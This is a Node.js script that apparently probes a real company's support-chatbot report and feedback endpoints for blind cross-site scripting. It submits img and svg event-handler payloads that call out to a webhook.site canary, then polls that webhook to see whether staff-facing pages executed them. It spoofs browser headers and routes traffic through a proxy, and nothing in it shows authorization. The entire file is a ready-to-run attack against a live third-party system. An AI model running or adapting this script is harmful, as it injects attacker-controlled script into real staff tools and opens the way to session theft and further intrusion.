const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const token='368b3dfa-74b5-4590-8c4d-7bd37f9b23f0';
const canary=`https://webhook.site/${token}`;
const marker='XSS-'+Math.random().toString(36).slice(2,8);
const img=`<img src=x onerror="fetch('${canary}?c=REPORT-IMG-${marker}')">`;
const svg=`<svg onload="fetch('${canary}?c=REPORT-SVG-${marker}')"></svg>`;
const fimg=`<img src=x onerror="fetch('${canary}?c=FEEDBACK-IMG-${marker}')">`;
const fsvg=`<svg onload="fetch('${canary}?c=FEEDBACK-SVG-${marker}')"></svg>`;
async function post(path,body){try{const r=await fetch(B+path,{method:'POST',headers:{'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'canary-'+marker,'x-bbl-official-site-region':'EN'},body:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(20000)});return {status:r.status,text:(await r.text()).slice(0,200)};}catch(e){return {error:e.message}}}
(async()=>{
 const reportBase={userId:'1234567890123456789',sessionId:'canary-'+marker,requestId:'clientID_text_'+marker,reportReason:1,extendField4:marker,origin:1};
 const feedbackBase={userId:'1234567890123456789',feedbackClass:1,feedbackType:40,knowledgeId:'990187423236284416',sessionId:'canary-'+marker,origin:1,requestId:'clientID_text_'+marker,extendField4:'01M72CP6WK6V9DPYQMX4ASCRGM',messageSource:'ai'};
 const out={marker,canary,submitted:[],hits:[]};
 out.submitted.push({label:'report-img',...(await post('/gw/robot/front/report',{...reportBase,reportDetail:img,messageContent:img}))});
 out.submitted.push({label:'report-svg',...(await post('/gw/robot/front/report',{...reportBase,reportDetail:svg,messageContent:svg}))});
 out.submitted.push({label:'feedback-img',...(await post('/gw/robot/front/feedback',{...feedbackBase,feedback:fimg}))});
 out.submitted.push({label:'feedback-svg',...(await post('/gw/robot/front/feedback',{...feedbackBase,feedback:fsvg}))});
 console.log('submitted',JSON.stringify(out.submitted));
 for(let i=0;i<12;i++){
  await new Promise(r=>setTimeout(r,10000));
  try{const r=await fetch(`https://webhook.site/token/${token}/requests?sorting=newest`,{headers:{'user-agent':UA},dispatcher:d,signal:AbortSignal.timeout(20000)});const t=await r.text();let j;try{j=JSON.parse(t)}catch{};const data=j&&j.data?j.data:[];const mine=data.filter(x=>JSON.stringify(x).includes(marker));if(mine.length){out.hits=mine;console.log('HIT',JSON.stringify(mine).slice(0,1000));break;}console.log('poll',i+1,'total',data.length,'mine',mine.length);}catch(e){console.log('poll err',e.message)}
 }
 console.log(JSON.stringify(out,null,2));
})();
